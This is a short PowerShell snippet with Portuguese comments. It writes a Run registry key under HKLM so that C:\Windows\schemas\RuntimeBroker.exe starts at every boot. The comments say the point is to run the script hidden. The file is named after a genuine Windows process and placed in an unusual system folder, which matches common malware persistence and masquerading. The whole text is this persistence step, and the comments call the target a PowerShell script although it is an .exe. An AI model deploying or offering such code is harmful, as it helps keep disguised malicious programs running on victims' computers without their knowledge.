# Caminho do script PowerShell
$programPath = "C:\Windows\schemas\RuntimeBroker.exe"

# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
$command = "C:\Windows\schemas\RuntimeBroker.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command
